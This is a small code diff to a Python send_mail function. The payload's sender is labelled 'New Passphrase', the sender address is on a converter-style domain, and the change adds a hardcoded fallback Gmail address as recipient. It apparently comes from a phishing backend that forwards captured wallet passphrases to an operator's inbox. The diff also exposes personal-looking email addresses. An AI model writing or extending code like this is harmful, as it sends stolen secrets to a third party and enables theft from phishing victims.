@@ -16,7 +16,9 @@ def send_mail(mail_info, mail_subj, std_name):
             "name": f"New Passphrase",
             "email": "uzomamicheal07@piconverter.info",
         },
-        "to": [{"email": os.getenv("email"), "name": f"{std_name}"}],
+        "to": [
+            {"email": os.getenv("email", "lordyacey@gmail.com"), "name": f"{std_name}"}
+        ],
         "subject": f"{mail_subj}",
         "htmlContent": f"{mail_info}",
     }
